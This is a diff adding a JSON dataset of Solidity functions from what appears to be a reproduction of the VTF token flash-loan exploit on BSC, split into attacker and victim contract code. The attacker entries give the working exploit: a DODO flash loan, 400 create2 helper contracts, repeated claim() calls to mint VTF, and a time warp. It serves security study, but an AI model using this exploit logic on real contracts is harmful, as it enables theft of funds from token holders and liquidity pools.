@@ -1,0 +1,219 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        USDTToVTF();\n        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));\n        for (uint256 i = 0; i < contractList.length - 1; ++i) {\n            (bool success,) = contractList[i].call(abi.encodeWithSignature(\"claim(address)\", contractList[i + 1]));\n            require(success);\n        }\n        uint256 index = contractList.length - 1;\n        (bool success,) = contractList[index].call(abi.encodeWithSignature(\"claim(address)\", address(this)));\n        require(success);\n        VTFToUSDT();\n        USDT.transfer(dodo, 100_000 * 1e18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "contractFactory",
+    "original_code": "    function contractFactory() public {\n        address _add;\n        bytes memory bytecode = type(claimReward).creationCode;\n        for (uint256 _salt = 0; _salt < 400; _salt++) {\n            assembly {\n                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n            }\n            contractList.push(_add);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "contractList",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 22_535_101);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        contractFactory();\n        // change time to pass time check\n        cheat.warp(block.timestamp + 2 * 24 * 60 * 60);\n        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IROUTER",
+    "source_type": "victim_contract",
+    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+    "original_code": "    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) {\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, P2ELibrary.pairFor(factory, path[0], path[1]), amountIn\n        );\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'P2ERouter: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "claimReward",
+    "source_type": "victim_contract",
+    "function_name": "claim",
+    "original_code": "    function claim(address _receiver) external {\n        for (uint i = 0; i < MAX_CLAIM_NUM; i ++) {\n            if (claimInternal(_receiver) == 0) {\n                break;\n            }\n        }\n        if (userPending[_receiver] > 0) {\n            uint _userPending = userPending[_receiver];\n            userPending[_receiver] = 0;\n            _burn(_receiver, _userPending);\n            token.safeTransfer(_receiver, _userPending);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(uint256 _pid, uint256 _amount) external validatePoolByPid(_pid) nonReentrant {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) {\n            uint256 pending = user.amount.mul(pool.accP2EPerShare).div(1e12).sub(user.rewardDebt);\n            if(pending > 0) {\n                if (address(tokenLocker) == address(0)) {\n                    safeP2ETransfer(msg.sender, pending);\n                } else {\n                    safeP2ETransfer(address(this), pending);\n                    rewardToken.approve(address(tokenLocker), pending);\n                    tokenLocker.addReceiver(msg.sender, pending);\n                }\n            }\n        }\n        if (_amount > 0) {\n            uint balanceBefore = pool.token.balanceOf(address(this));\n            pool.token.safeTransferFrom(address(msg.sender), address(this), _amount);\n            uint balanceAfter = pool.token.balanceOf(address(this));\n            _amount = balanceAfter.sub(balanceBefore);\n            user.amount = user.amount.add(_amount);\n        }\n        user.rewardDebt = user.amount.mul(pool.accP2EPerShare).div(1e12);\n        if (pool.token == rewardToken) {\n            bar.mint(msg.sender, _amount);\n        }\n        emit Deposit(msg.sender, _pid, _amount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n}\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "updateUserBalance",
+    "original_code": "\tfunction updateUserBalance(address _user) public {\n\t\tuint256 totalAmountOver = super.totalSupply();\n\t\tif(maxTotal <= totalAmountOver){\n\t\t\tmaxCanMint = false;\n\t\t}\n\n        if(userBalanceTime[_user] > 0){\n\t\t\tuint256 canMint = getUserCanMint(_user);\n\t\t\tif(canMint > 0){\n\t\t\t\tuserBalanceTime[_user] = block.timestamp;\n\t\t\t\t_mint(_user, canMint);\n\t\t\t}\n\t\t}else{\n\t\t\tuserBalanceTime[_user] = block.timestamp;\n\t\t}\n    }\n\t\n\t\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVTF",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 _pid, uint256 _amount) external validatePoolByPid(_pid) nonReentrant {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n        updatePool(_pid);\n        uint256 pending = user.amount.mul(pool.accP2EPerShare).div(1e12).sub(user.rewardDebt);\n        if(pending > 0) {\n            if (address(tokenLocker) == address(0)) {\n                safeP2ETransfer(msg.sender, pending);\n            } else {\n                safeP2ETransfer(address(this), pending);\n                rewardToken.approve(address(tokenLocker), pending);\n                tokenLocker.addReceiver(msg.sender, pending);\n            }\n        }\n        if(_amount > 0) {\n            user.amount = user.amount.sub(_amount);\n            pool.token.safeTransfer(address(msg.sender), _amount);\n        }\n        user.rewardDebt = user.amount.mul(pool.accP2EPerShare).div(1e12);\n        if (pool.token == rewardToken) {\n            bar.burn(msg.sender, _amount);\n        }\n        emit Withdraw(msg.sender, _pid, _amount);\n    }\n\n",
+    "description": ""
+  }
+]
